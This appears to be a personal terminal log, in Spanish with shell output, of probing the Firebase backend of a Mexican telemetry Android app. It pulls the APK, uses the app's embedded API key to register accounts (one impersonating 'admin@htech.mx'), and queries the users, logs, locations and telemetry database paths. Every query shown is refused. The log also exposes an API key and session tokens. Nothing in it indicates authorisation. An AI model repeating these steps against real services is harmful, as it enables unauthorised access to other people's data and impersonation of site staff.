

```
adb shell pm list packages  | grep telemetry
package:mx.htech.telemetry_htech
package:com.google.mainline.telemetry



```

```
adb shell pm path mx.htech.telemetry_htech
package:/data/app/~~mtrDhl8OhwfbMIKUrogpXQ==/mx.htech.telemetry_htech-IYVjXR6mIkyzOKOJv1xrjQ==/base.apk
package:/data/app/~~mtrDhl8OhwfbMIKUrogpXQ==/mx.htech.telemetry_htech-IYVjXR6mIkyzOKOJv1xrjQ==/split_config.arm64_v8a.apk
package:/data/app/~~mtrDhl8OhwfbMIKUrogpXQ==/mx.htech.telemetry_htech-IYVjXR6mIkyzOKOJv1xrjQ==/split_config.en.apk
package:/data/app/~~mtrDhl8OhwfbMIKUrogpXQ==/mx.htech.telemetry_htech-IYVjXR6mIkyzOKOJv1xrjQ==/split_config.es.apk
package:/data/app/~~mtrDhl8OhwfbMIKUrogpXQ==/mx.htech.telemetry_htech-IYVjXR6mIkyzOKOJv1xrjQ==/split_config.xxhdpi.apk
```


## Copiar apk

```
adb pull /data/app/~~mtrDhl8OhwfbMIKUrogpXQ==/mx.htech.telemetry_htech-IYVjXR6mIkyzOKOJv1xrjQ==/base.apk .
/data/app/~~mtrDhl8OhwfbMIKUrogpXQ==/mx.htech.telemetry_htech-IYVjXR6mIkyzOKOJv1xrjQ==/base.apk: 1 file pulled, 0 skipped. 76.1 MB/s (5537571 bytes in 0.069s)
```



```
curl -H "Content-Type: application/json" \
     -d '{"email":"hacker@test.com", "password":"Password123!", "returnSecureToken":true}' \
     "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyBlTm9fcDL0zWhNAoZOBOM-q_mb_PAHqUA"
{
  "kind": "identitytoolkit#SignupNewUserResponse",
  "idToken": "eyJhbGciOiJSUzI1NiIsImtpZCI6IjQ1YTZjMGMyYjgwMDcxN2EzNGQ1Y2JiYmYzOWI4NGI2NzYxMjgyNjUiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vcmVnaXN0cm8tN2RmMzAiLCJhdWQiOiJyZWdpc3Ryby03ZGYzMCIsImF1dGhfdGltZSI6MTc2Mzc3MjExNywidXNlcl9pZCI6InRMelpacWFvYTdid0x0WUYyTkdyczBuUkpHazIiLCJzdWIiOiJ0THpaWnFhb2E3YndMdFlGMk5HcnMwblJKR2syIiwiaWF0IjoxNzYzNzcyMTE3LCJleHAiOjE3NjM3NzU3MTcsImVtYWlsIjoiaGFja2VyQHRlc3QuY29tIiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJmaXJlYmFzZSI6eyJpZGVudGl0aWVzIjp7ImVtYWlsIjpbImhhY2tlckB0ZXN0LmNvbSJdfSwic2lnbl9pbl9wcm92aWRlciI6InBhc3N3b3JkIn19.a8zWWWJA_39xdDKitxCjLrbrYDOLZtWCDtpHr7d_GzP6c13wwq8Djp8IA4TVdj2vlVyQkiQdrvtFB4RQENNHBF383vErKV6nbgAlZH7IudOWcrdxEHRaONByBBNRz9pc3cUDRRJanNTFqg5MbsGNJ-FqLobECqNbmAuSzG7sPjUddVrTwJ4_F4bzc-qpBDF28cf3LwYEvevq-gtnF_qruAsXmkabviuiyU3mo5AMVVnfJkBiDM4yd1XPfA9AUzGHTiFpt2C1E5--xSbBjjHAZiADIZCfGhVycc-_Yfk9rYRBdu2_RN043obZL96akcbOTZ5J7KIzNtonuZcDzwM3Qw",
  "email": "hacker@test.com",
  "refreshToken": "AMf-vBws4xd8_j2H9mzFdv-J6TW_RNv1MqUNlxmE6k_nqslkNDP62cSVyvSBgchMouxR9qefZApScPGgbDro585qpS0wd_ftb7Fg4yPyI1gmkbaKyiS-1brHCoNZHkmvOSboCY7HYSb89mPiiW3i-7EEvYiIRmr_7XwkyDdfUMF6m5Eeofrw2SjFS9P9OQdZrpXrYWnoYrKM_7KPWemib_-WKNihy8S4sw",
  "expiresIn": "3600",
  "localId": "tLzZZqaoa7bwLtYF2NGrs0nRJGk2"
}
```


```
# Opción A: Si quieres copiar y pegar el token directamente
curl -s "https://registro-7df30.firebaseio.com/.json?auth=eyJhbGciOiJSUzI1NiIsImtpZCI6IjQ1YTZjMGMyYjgwMDcxN2EzNGQ1Y2JiYmYzOWI4NGI2NzYxMjgyNjUiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vcmVnaXN0cm8tN2RmMzAiLCJhdWQiOiJyZWdpc3Ryby03ZGYzMCIsImF1dGhfdGltZSI6MTc2Mzc3MjExNywidXNlcl9pZCI6InRMelpacWFvYTdid0x0WUYyTkdyczBuUkpHazIiLCJzdWIiOiJ0THpaWnFhb2E3YndMdFlGMk5HcnMwblJKR2syIiwiaWF0IjoxNzYzNzcyMTE3LCJleHAiOjE3NjM3NzU3MTcsImVtYWlsIjoiaGFja2VyQHRlc3QuY29tIiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJmaXJlYmFzZSI6eyJpZGVudGl0aWVzIjp7ImVtYWlsIjpbImhhY2tlckB0ZXN0LmNvbSJdfSwic2lnbl9pbl9wcm92aWRlciI6InBhc3N3b3JkIn19.a8zWWWJA_39xdDKitxCjLrbrYDOLZtWCDtpHr7d_GzP6c13wwq8Djp8IA4TVdj2vlVyQkiQdrvtFB4RQENNHBF383vErKV6nbgAlZH7IudOWcrdxEHRaONByBBNRz9pc3cUDRRJanNTFqg5MbsGNJ-FqLobECqNbmAuSzG7sPjUddVrTwJ4_F4bzc-qpBDF28cf3LwYEvevq-gtnF_qruAsXmkabviuiyU3mo5AMVVnfJkBiDM4yd1XPfA9AUzGHTiFpt2C1E5--xSbBjjHAZiADIZCfGhVycc-_Yfk9rYRBdu2_RN043obZL96akcbOTZ5J7KIzNtonuZcDzwM3Qw" | jq
```

```
export TOKEN="eyJhbGciOiJSUzI1NiIsImtpZCI6IjQ1YTZjMGMyYjgwMDcxN2EzNGQ1Y2JiYmYzOWI4NGI2NzYxMjgyNjUiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vcmVnaXN0cm8tN2RmMzAiLCJhdWQiOiJyZWdpc3Ryby03ZGYzMCIsImF1dGhfdGltZSI6MTc2Mzc3MjExNywidXNlcl9pZCI6InRMelpacWFvYTdid0x0WUYyTkdyczBuUkpHazIiLCJzdWIiOiJ0THpaWnFhb2E3YndMdFlGMk5HcnMwblJKR2syIiwiaWF0IjoxNzYzNzcyMTE3LCJleHAiOjE3NjM3NzU3MTcsImVtYWlsIjoiaGFja2VyQHRlc3QuY29tIiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJmaXJlYmFzZSI6eyJpZGVudGl0aWVzIjp7ImVtYWlsIjpbImhhY2tlckB0ZXN0LmNvbSJdfSwic2lnbl9pbl9wcm92aWRlciI6InBhc3N3b3JkIn19.a8zWWWJA_39xdDKitxCjLrbrYDOLZtWCDtpHr7d_GzP6c13wwq8Djp8IA4TVdj2vlVyQkiQdrvtFB4RQENNHBF383vErKV6nbgAlZH7IudOWcrdxEHRaONByBBNRz9pc3cUDRRJanNTFqg5MbsGNJ-FqLobECqNbmAuSzG7sPjUddVrTwJ4_F4bzc-qpBDF28cf3LwYEvevq-gtnF_qruAsXmkabviuiyU3mo5AMVVnfJkBiDM4yd1XPfA9AUzGHTiFpt2C1E5--xSbBjjHAZiADIZCfGhVycc-_Yfk9rYRBdu2_RN043obZL96akcbOTZ5J7KIzNtonuZcDzwM3Qw"
 ~/Downloads/tmp/h-tech 

❯ curl -s "https://registro-7df30.firebaseio.com/.json?auth=$TOKEN" | jq
{
  "error": "Permission denied"
}
```


```
curl -s "https://registro-7df30.firebaseio.com/telemetry.json?auth=$TOKEN" | jq
{
  "error": "Permission denied"
}
 ~/Downloads/tmp/h-tech 
❯ curl -s "https://registro-7df30.firebaseio.com/users.json?auth=$TOKEN" | jq
curl -s "https://registro-7df30.firebaseio.com/logs.json?auth=$TOKEN" | jq
curl -s "https://registro-7df30.firebaseio.com/locations.json?auth=$TOKEN" | jq
{
  "error": "Permission denied"
}
{
  "error": "Permission denied"
}
{
  "error": "Permission denied"
}
 ~/Downloads/tmp/h-tech 
❯
```


### regitrar htech user

```
curl -H "Content-Type: application/json" \
     -d '{"email":"admin@htech.mx", "password":"Password123!", "returnSecureToken":true}' \
     "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyBlTm9fcDL0zWhNAoZOBOM-q_mb_PAHqUA"
{
  "kind": "identitytoolkit#SignupNewUserResponse",
  "idToken": "eyJhbGciOiJSUzI1NiIsImtpZCI6IjQ1YTZjMGMyYjgwMDcxN2EzNGQ1Y2JiYmYzOWI4NGI2NzYxMjgyNjUiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vcmVnaXN0cm8tN2RmMzAiLCJhdWQiOiJyZWdpc3Ryby03ZGYzMCIsImF1dGhfdGltZSI6MTc2Mzc3MjQ1MywidXNlcl9pZCI6ImVSc29xMlFSS3pkQVRrSDdueVp5T25yWkhUMDIiLCJzdWIiOiJlUnNvcTJRUkt6ZEFUa0g3bnlaeU9uclpIVDAyIiwiaWF0IjoxNzYzNzcyNDUzLCJleHAiOjE3NjM3NzYwNTMsImVtYWlsIjoiYWRtaW5AaHRlY2gubXgiLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnsiZW1haWwiOlsiYWRtaW5AaHRlY2gubXgiXX0sInNpZ25faW5fcHJvdmlkZXIiOiJwYXNzd29yZCJ9fQ.2CK8c45WLxDYpRqOcDOx3Vo691Y8HV0_Dhc0yjiKNDnS8mFAZcDoB1YyOQEx0PL74WAu6NmExXycVUbohQm5PQ2A3ex6srG35GEMPLjfUiaRlSdIt_sWLN046QMWTF_vx8ibHHA5gSue6yfoVOZ7_vhtLZsZ3lJhw5IXoB2byVSZGiymj5D-FxB5okGqwukf4mRAWf_gtvBU8oEuk9qEbRzmqXVEzyviuP84FtDpUQpNeAy6RXjdT0Xi9NrPEkTBnNa6thJcVioPMPpMJlwPdxKyzpBVA2jOII1pYCl9COXltManibTlGoD4h5RyuejiXd9XQ8j8RL7UXnL-x8MuSA",
  "email": "admin@htech.mx",
  "refreshToken": "AMf-vBx-SYkTYg5LauWumCXXWrCZNRKfa2iRyRaXbxkL6_rdLlMj4vwEnVaMH7ZjCnquv7iwXqugrL6bV1LGb9eCUHx33xsNfz4z5hldKwrWpb_sb5-VQH1_USqRLwy3gdmi3un4EKQ6ZduKXpMvhzt7i_hZHpbsxdWEJbe7oJWJW3mWv5LNkMUczF4DzLysyJryty6wwNUoIeVd8jICAgLJFn_bE-gNIg",
  "expiresIn": "3600",
  "localId": "eRsoq2QRKzdATkH7nyZyOnrZHT02"
}
```

```
export TOKEN="eyJhbGciOiJSUzI1NiIsImtpZCI6IjQ1YTZjMGMyYjgwMDcxN2EzNGQ1Y2JiYmYzOWI4NGI2NzYxMjgyNjUiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vcmVnaXN0cm8tN2RmMzAiLCJhdWQiOiJyZWdpc3Ryby03ZGYzMCIsImF1dGhfdGltZSI6MTc2Mzc3MjQ1MywidXNlcl9pZCI6ImVSc29xMlFSS3pkQVRrSDdueVp5T25yWkhUMDIiLCJzdWIiOiJlUnNvcTJRUkt6ZEFUa0g3bnlaeU9uclpIVDAyIiwiaWF0IjoxNzYzNzcyNDUzLCJleHAiOjE3NjM3NzYwNTMsImVtYWlsIjoiYWRtaW5AaHRlY2gubXgiLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnsiZW1haWwiOlsiYWRtaW5AaHRlY2gubXgiXX0sInNpZ25faW5fcHJvdmlkZXIiOiJwYXNzd29yZCJ9fQ.2CK8c45WLxDYpRqOcDOx3Vo691Y8HV0_Dhc0yjiKNDnS8mFAZcDoB1YyOQEx0PL74WAu6NmExXycVUbohQm5PQ2A3ex6srG35GEMPLjfUiaRlSdIt_sWLN046QMWTF_vx8ibHHA5gSue6yfoVOZ7_vhtLZsZ3lJhw5IXoB2byVSZGiymj5D-FxB5okGqwukf4mRAWf_gtvBU8oEuk9qEbRzmqXVEzyviuP84FtDpUQpNeAy6RXjdT0Xi9NrPEkTBnNa6thJcVioPMPpMJlwPdxKyzpBVA2jOII1pYCl9COXltManibTlGoD4h5RyuejiXd9XQ8j8RL7UXnL-x8MuSA"
 ~/Downloads/tmp/h-tech 
❯ curl -s "https://registro-7df30.firebaseio.com/telemetry.json?auth=$TOKEN" | jq
{
  "error": "Permission denied"
}
 ~/Downloads/tmp/h-tech 
❯ curl -s "https://registro-7df30.firebaseio.com/users.json?auth=$TOKEN" | jq
curl -s "https://registro-7df30.firebaseio.com/logs.json?auth=$TOKEN" | jq
curl -s "https://registro-7df30.firebaseio.com/locations.json?auth=$TOKEN" | jq
{
  "error": "Permission denied"
}
{
  "error": "Permission denied"
}
{
  "error": "Permission denied"
}
```



```
curl -H "Content-Type: application/json" \
     -d '{"email":"admin@htech.mx", "password":"Password123!", "returnSecureToken":true}' \
     "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyBlTm9fcDL0zWhNAoZOBOM-q_mb_PAHqUA"
```